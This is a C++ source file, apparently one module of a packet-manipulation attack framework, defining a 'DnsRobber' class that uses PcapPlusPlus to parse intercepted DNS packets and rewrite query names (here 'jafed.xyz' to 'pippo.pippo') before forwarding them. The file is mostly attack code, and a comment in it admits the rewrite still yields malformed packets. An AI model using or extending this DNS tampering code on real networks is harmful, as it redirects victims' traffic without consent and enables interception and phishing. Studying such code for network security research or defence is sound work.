#include "Attack.cpp"
#include "fstream"
#include "iostream"
#include "pcapplusplus/DnsLayer.h"
#include "pcapplusplus/EthLayer.h"
#include "pcapplusplus/HttpLayer.h"
#include "pcapplusplus/IPv4Layer.h"
#include "pcapplusplus/Packet.h"
#include "pcapplusplus/PcapFileDevice.h"
#include "pcapplusplus/PcapLiveDeviceList.h"
#include "pcapplusplus/TcpLayer.h"
#include "pcapplusplus/UdpLayer.h"
#include "pcapplusplus/VlanLayer.h"
#include <stdlib.h>
#include <string.h>

#define DEBUG(x)        \
    do {                \
        std::cerr << x; \
    } while (0)

using namespace std;
using namespace pcpp;

class DnsRobber : public Attack {

public:
    static const int level = 5;
    int n{2};

    DnsRobber(){};
    ~DnsRobber(){};
    vector<RawPacket *> *craft(RawPacket *inPacket) {
        Packet parsedPacket(inPacket);
        vector<RawPacket *> *pp = new vector<RawPacket *>();
        //TODO: adesso la sostituzione è in query ed in answer e ritorna malformed packet. Separare??
        DnsQuery *q;
        DnsLayer *response = parsedPacket.getLayerOfType<DnsLayer>();
        if (response == NULL || (q = response->getFirstQuery()) == NULL)
            return nullptr;
        do {
            DEBUG(q->getName());
            //*(map<string, string> *)(c.data)
            map<string, string> substitutions = {{"jafed.xyz", "pippo.pippo"}, {"www.jafed.xyz", "www.pippo.pippo"}};
            for (auto &dnsname : substitutions) {
                if (q->getName().compare(dnsname.first) == 0 && q->setName(dnsname.second))
                    DEBUG(" --> " << dnsname.second << endl);
            }
            this->shots++;
        } while ((q = response->getNextQuery(q)) != NULL);
        pp->push_back(inPacket);
        return pp;
    }
};